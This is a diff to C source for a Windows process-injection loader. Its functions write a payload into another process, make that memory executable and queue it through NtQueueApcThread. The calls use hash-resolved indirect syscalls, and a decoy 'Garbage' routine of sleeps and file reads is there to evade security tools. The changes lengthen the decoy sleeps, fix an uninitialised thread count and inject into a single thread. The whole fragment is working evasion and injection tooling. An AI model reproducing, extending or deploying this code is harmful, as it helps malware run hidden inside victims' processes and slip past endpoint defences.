@@ -9,10 +9,10 @@ void Garbage()
 	for (int i = 0; i < 3; i++)
 	{
 		OFSTRUCT temp;
-		Sleep(1);
+		Sleep(100);
 		OpenFile((LPCSTR)"conf.txt", &temp, OF_READ);
 		GetTickCount();
-		Sleep(1);
+		Sleep(100);
 		OpenFile((LPCSTR)"config.txt", &temp, OF_READ);
 	}
 }
@@ -154,7 +154,7 @@ void ContextInjection(node* head, const char* process_name, unsigned char* paylo
 	Garbage();
 
 	HANDLE threads[20];
-	unsigned int n_threads;
+	unsigned int n_threads = 0;
 	FindThread(pid, threads, &n_threads);
 
 	LPVOID pRemoteCode = NULL;
@@ -287,7 +287,7 @@ void APCLazyInjection(node* head, const char* process_name, unsigned char* paylo
 	indirectSyscall(&hProc, PROCESS_ALL_ACCESS, &attributes, &cid);
 
 	HANDLE threads[20];
-	unsigned int n_threads;
+	unsigned int n_threads = 0;
 	FindThread(pid, threads, &n_threads);
 
 	LPVOID pRemoteCode = NULL;
@@ -307,13 +307,18 @@ void APCLazyInjection(node* head, const char* process_name, unsigned char* paylo
 	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
 	syscall_number = getSyscallbyHash(head, 0x82962c8);
 	indirectSyscall(hProc, (PVOID*)&pRemoteCode, &memorySize, PAGE_EXECUTE_READ, &oldprotect);
-	for (int i = 0; i < n_threads; i++)
+	/*for (int i = 0; i < n_threads; i++)
 	{
+		Sleep(5*1000);
 		NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
 		syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
 		syscall_number = getSyscallbyHash(head, 0xd4612238);
 		indirectSyscall(threads[i], pRemoteCode, NULL, NULL, 0);
-	}
+	}*/
+	NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
+	syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
+	syscall_number = getSyscallbyHash(head, 0xd4612238);
+	indirectSyscall(threads[0], pRemoteCode, NULL, NULL, 0);
 }
 #endif
 
